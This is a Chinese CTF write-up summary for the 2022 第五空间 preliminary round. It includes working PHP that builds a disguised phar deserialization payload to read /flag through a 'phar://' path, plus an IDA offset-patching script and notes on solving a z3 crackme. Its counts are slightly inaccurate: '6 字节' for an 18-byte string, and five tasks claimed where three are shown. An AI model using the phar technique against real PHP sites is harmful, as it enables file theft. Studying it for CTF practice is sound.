---
title: 2022 第五空间网络安全初赛 WriteUp by Arr3stY0u
contest: 第五空间 2022
year: 2022
difficulty: medium
vuln_type: deserialize
tags: [phar反序列化, 任意文件读取, rootfs.img, crackme, z3约束求解, 多字节异或, safevm]
attack_chain:
  - file_exist(img_name) 触发 phar:// 反序列化
  - 生成 upload 类 phar 包改 png 后缀上传
  - 触发 __wakeup 调用 file_get_contents(/flag) 输出
  - binwalk -Me rootfs.img 拆 mips 路由器文件系统
  - 读 /bin/crackme + /etc/config
  - IDA 重命名 seg000 + 用 ida_bytes.patch_dword 调偏移
  - 用 z3 求解 16 字节输入满足 dword_422000 16 个线性方程
  - 多次 Sbox 替换 (Fun_0x7 ~ Fun_0x1d) 还原 flag
  - safevm 远端偏移量不同（未完成）
key_payload: 'phar://upload/phar.png'
one_liner: 5 题：phar反序列化、rootfs crackme z3 求解、SMC 多字节异或、safevm 未完成。
lesson: phar 触发链 = 上传 phar 改 png 后缀 + file_exist 触发；crackme 远端偏移和本地不同是常见坑。
quality: high
---

# 2022 第五空间网络安全初赛 WriteUp by Arr3stY0u

## 来源
- 原文：ctfiot.com/57918.html
- 作者：Arr3stY0u

## 5 道题详解

### MISC
**简单的 misc** - 6 字节 hex 解码：
```python
print(bytes.fromhex("666c61677b57656c636f6d655f686572657d"))
# flag{Welcome_here}
```

### WEB
**web_BaliYun**（phar 反序列化）：
- 入口：`file_exist($img_name)` 在 `index.php?img_name=...`
- 触发链：上传 phar 改 png 后缀 → `phar://upload/phar.png` 触发 `__wakeup` → `file_get_contents(/flag)` 输出
- 生成 phar 代码：
  ```php
  $phar = new Phar('phar.phar');
  $phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
  $phar->addFromString('test.txt','test');
  $object = new upload("/flag");
  $phar->setMetadata($object);
  ```

### REVERSE
**crackme**（rootfs + z3）：
- `binwalk -Me rootfs.img` 拆出 `/bin/crackme` + `/etc/config`
- IDA 静态分析，发现 sbox 替换 + 16 字节输入需满足 16 个线性方程（dword_422000 数组）
- **关键坑**：本地偏移 `0x4644`，远端 `0xFFFFED68`，需 patch dword
- patch 脚本：
  ```python
  off = 0xFFFFED68 - 0x4644
  for i in range(9):
      x = ida_bytes.get_dword(0x0c+i*4)
      ida_bytes.patch_dword(0x0c+i*4, x-off)
  ```
- 用 z3 求解 16 字节输入

### 未完成
**safevm**（远端偏移量不一致，时间不够）

## 适用场景
- phar 反序列化触发链
- rootfs 固件 binwalk 拆解
- z3 线性约束求解
- IDA patch_dword 调偏移

## 团队
Arr3stY0u 招新大二及以下 web/pwn/crypto/SRC 师傅，考核通过赠书。
